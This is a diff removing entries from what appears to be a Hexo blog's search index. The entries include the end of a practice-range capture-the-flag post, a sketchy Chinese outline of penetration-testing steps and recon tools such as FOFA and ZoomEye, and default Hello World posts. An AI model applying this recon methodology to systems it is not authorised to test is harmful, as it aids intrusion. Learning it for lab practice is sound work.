-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">cat theflag.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MTA3YTlhZjdiZmYwOTBmNzg5MTUzMjhlZTg2YzNiYWZfdENoZGVkcVMydWs2OVZjQTVXZ2o0S2trT2hwNWxKQjBfVG9rZW46SEF3VWJCREgyb0hCUTJ4bEp2bWNsVElLbmxiXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-]]></content>
-      <categories>
-        <category>靶场，DC系列</category>
-      </categories>
-      <tags>
-        <tag>靶场</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>好杂</title>
-    <url>/2024/03/31/ni-hao/</url>
-    <content><![CDATA[<h1 id="很杂"><a href="#很杂" class="headerlink" title="很杂"></a>很杂</h1><p>很杂</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWY5YzU0ODVkZmQyMWQ1OTllZDU4YzUzODQ3Y2I0ZjJfN1RENVNyZkdQNTBNOHpyak9YR0Y2aDUxeWdxNnZ5NU5fVG9rZW46UFl3QWJmU1B5b1lYbFZ4VnV1cmNTWUxqblFmXzE3MTE4Njk5ODQ6MTcxMTg3MzU4NF9WNA" alt="img"></p>
-<h1 id="渗漏测试流程"><a href="#渗漏测试流程" class="headerlink" title="渗漏测试流程"></a>渗漏测试流程</h1><ol>
-<li>明确目标</li>
-<li>信息收集</li>
-</ol>
-<p> 域名，子域名，端口，网络架构，网站目录结构。。。。。。。</p>
-<ol>
-<li>漏洞分析&#x2F;漏洞扫描&#x2F;寻找漏洞</li>
-<li>漏洞利用</li>
-</ol>
-<p>Http  80 </p>
-<p>Https  443 </p>
-<hr>
-<p><img src="C:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240331152749707.png" alt="image-20240331152749707"></p>
-<hr>
-<p>域名</p>
-<p>IP</p>
-<p>端口</p>
-<p>cms指纹</p>
-<p>网络空间测绘</p>
-<p>目录扫描</p>
-<hr>
-<p>网络空间测绘：</p>
-<p>钟馗之眼&#x2F;<a href="https://www.zoomeye.hk/">首页 - ZoomEye 真地图，网络空间地图的全球领导者</a></p>
-<p>fofa&#x2F;<a href="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a></p>
-<p>quake.360.cn&#x2F;<a href="https://www.zoomeye.hk/">首页 - ZoomEye 真地图，网络空间地图的全球领导者</a></p>
-<p>鹰图&#x2F;<a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p>
-<p><img src="https://img2020.cnblogs.com/blog/1950264/202007/1950264-20200731170503369-279339554.jpg" alt="Snipaste_2020-07-31_15-42-19"></p>
-]]></content>
-      <categories>
-        <category>Blog</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>使用Hexo搭建个人博客</title>
-    <url>/2024/03/30/My-Blog/</url>
-    <content><![CDATA[<hr>
-<h1 id="第一篇博客"><a href="#第一篇博客" class="headerlink" title="第一篇博客"></a>第一篇博客</h1><p>​	今日不同往时，生死看淡，不服就干，奥里给！！！！！！</p>
-]]></content>
-      <categories>
-        <category>Blog</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2024/03/30/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-</search>
+</div></body></html>
